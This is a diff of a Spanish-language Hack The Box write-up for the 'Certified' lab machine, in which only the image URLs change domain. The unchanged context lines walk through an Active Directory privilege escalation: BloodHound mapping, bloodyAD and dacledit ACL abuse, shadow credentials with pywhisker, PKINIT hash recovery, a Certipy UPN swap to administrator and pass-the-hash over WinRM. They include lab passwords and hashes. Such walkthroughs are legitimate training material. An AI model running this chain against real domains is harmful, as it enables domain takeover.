@@ -5,7 +5,7 @@ excerpt:
 date: 2025-3-18
 classes: wide
 header:
-  teaser: https://404zzero.github.io/zzero.github.io//assets/images/certified/certified_avatar.png
+  teaser: https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/certified_avatar.png
   teaser_home_page: true
 categories:
   - hacking
@@ -37,7 +37,7 @@ lo primero como siempre el escaneo de Nmap
 nmap -p- --open --min-rate 5000 -sT -vvv -n -Pn 10.10.11.41 -oG allports
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219142548.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219142548.png)
 
 ```bash
 nmap -sVC -p53,88,135,139,389,445,593,636,3269,5985,9389,49666,49668,49673,49674,49683,49773 10.10.11.41 -oN ports
@@ -108,7 +108,7 @@ comprovamos las credenciaales del usuario que nos da por defetcto HTB y aparte s
 nxc smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219143502.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219143502.png)
 
 vamos a sacar el bloodhunt de esta mquina para poder usarlo
 
@@ -118,7 +118,7 @@ python3 bloodhound.py -d certified.htb -ns 10.10.11.41 -u judith.mader -p judith
 
 nos genera un .zip
 yo lo voy a abrir usando la version de docker
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220115214.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220115214.png)
 descubrimos esta estructura
 porlo que podemos intenar ganar acceso a Management y des hay a CA_operartor  y despues ser admin
 
@@ -133,7 +133,7 @@ https://github.com/CravateRouge/bloodyAD
 python3 bloodyAD.py --host "10.10.11.41" -d 'certified.htb' -u 'judith.mader' -p 'judith09' set owner Management judith.mader
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220120508.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220120508.png)
 
 ahora vamos a conseguir los permisos de escritura con dacledit.py
 https://github.com/fortra/impacket/blob/master/examples/dacledit.py
@@ -142,7 +142,7 @@ https://github.com/fortra/impacket/blob/master/examples/dacledit.py
 python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121029.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121029.png)
 
 perfecto por lo que como tenemos ya estos permisos ya podemos añadir a Management al grupo
 para ello vamos a volver a usar bloodAD
@@ -151,7 +151,7 @@ para ello vamos a volver a usar bloodAD
 python3 bloodyAD.py --host "10.10.11.41" -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121534.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121534.png)
 
 vale perfecto ahora como somos totalmente del grupo podemos intentar sacar el certificado al usuario management_svc
 vamos a usar pywhisker
@@ -161,7 +161,7 @@ https://github.com/ShutdownRepo/pywhisker
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122103.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122103.png)
 
 ahora vamos usar kerberos para intentar conseguir el ticket (TGT) gracias al certificado que emos conseguido
 
@@ -172,7 +172,7 @@ https://github.com/dirkjanm/PKINITtools
  python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/zzero/certified/content/pywhisker/pywhisker/GMgSVanb.pfx -pfx-pass EwVgr6W570k5CtV5i4tB fuck2.ccache
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122945.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122945.png)
 no suelta un erro y es por el tema de zona horaria para solucionarlo hay que hacer lo siguiente
 
 ```bash
@@ -181,7 +181,7 @@ ntpdate certified.htb
 
 volvemos a ejecutar el comando y
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193054.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193054.png)
 
 ya funciono por lo que tenemos ticket y .ccache
 
@@ -202,7 +202,7 @@ y ahora ejecutamos de la siguiente forma
 python3 getnthash.py certified.htb/management_svc -key d7964090a53e45440fe4f7dbbfc0f3ad8555820724dc83dbeb1eb6d673f7ed04
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193550.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193550.png)
 
 tenemos hahs por lo que podemos acceder a la mquina 
 
@@ -212,7 +212,7 @@ verificamos que tengamos winrm con el usuario management_svc con netexect
 nxc winrm 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193752.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193752.png)
 
 tenemos acceso pero no nos vale de nada porque es solo para la flag
 
@@ -226,7 +226,7 @@ https://github.com/ly4k/Certipy
 ```bash
 certipy shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
 ```
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194456.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194456.png)
 
 tenemos un segundo hash
 ahora actualizamos su UPN
@@ -234,14 +234,14 @@ ahora actualizamos su UPN
 certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn administrator
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194635.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194635.png)
 
 pedimos un certificado de administrador
 ```bash
 certipy req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194906.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194906.png)
 
 ahora restauramos el NPU original
 
@@ -249,7 +249,7 @@ ahora restauramos el NPU original
 certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn ca_operator@certified.htb
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195004.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195004.png)
 
 y obtenemos el TGT de admin
 
@@ -257,7 +257,7 @@ y obtenemos el TGT de admin
 certipy auth -pfx administrator.pfx -domain certified.htb
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195111.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195111.png)
 
 y ya con netexect comprovamos si tenemos acceso
 
@@ -265,5 +265,5 @@ y ya con netexect comprovamos si tenemos acceso
 nxc winrm 10.10.11.41 -u 'administrator' -H '0d5b49608bbce1751f708748f67e2d34'
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195224.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195224.png)
 
